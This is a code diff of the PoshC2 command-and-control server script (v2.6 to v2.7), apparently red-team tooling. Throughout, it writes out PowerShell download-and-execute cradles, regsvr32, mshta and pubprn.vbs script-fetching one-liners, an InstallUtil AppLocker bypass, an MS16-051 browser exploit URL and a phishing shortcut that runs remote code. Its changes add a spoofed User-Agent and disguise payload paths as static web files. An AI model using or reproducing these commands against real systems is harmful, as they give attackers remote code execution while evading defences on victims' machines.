@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.6 www.PoshC2.co.uk ==============" -ForegroundColor Green
+Write-Host "=============== v2.7 www.PoshC2.co.uk ==============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -787,15 +787,18 @@ if ($RestartC2Server)
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
     write-host $shortcut `n -ForegroundColor green
-    Write-Host "For a more stealthy approach internally, use SubTee's Regsvr32:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    Write-Host "For a more stealthy approach, use SubTee's exploits:"
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
-    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
+    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
+
 
     #launch a new powershell session with the implant handler running
     Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
@@ -948,9 +951,9 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     
     $downloaduri = Get-RandomURI -Length 5
     if ($ipv4address.Contains("https")) {
-        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
     } else {
-        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+""     
+        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
     }
 
     $httpresponse = '
@@ -1059,15 +1062,15 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 
     write-host $shortcut `n -ForegroundColor green
     Write-Host "For a more stealthy approach, use SubTee's exploits:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloaduri)_cs`"" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     # call back command
     $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
@@ -1077,6 +1080,7 @@ $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
+$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
@@ -1141,7 +1145,7 @@ primer | iex }'
     $Shortcut.Save()
 
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
     $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -1192,15 +1196,15 @@ while ($listener.IsListening)
     $context = $listener.GetContext() # blocks until request is received
     $request = $context.Request
     $response = $context.Response       
-    if ($request.Url -match "/$($downloaduri)$") 
+    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
     {
         $message = $payload
     }
-    if ($request.Url -match "/$($downloaduri)_ms16-051$")
+    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
     {
         $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
     }
-    if ($request.Url -match "/$($downloaduri)_rg$") 
+    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
     {
 
         $payloadparams = $payload -replace "powershell.exe ",""
@@ -1240,7 +1244,7 @@ while ($listener.IsListening)
 
 </scriptlet>'
     }
-    if ($request.Url -match "/$($downloaduri)_cs$") 
+    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
     {
 
         $payloadparams = $payload -replace "powershell.exe ",""
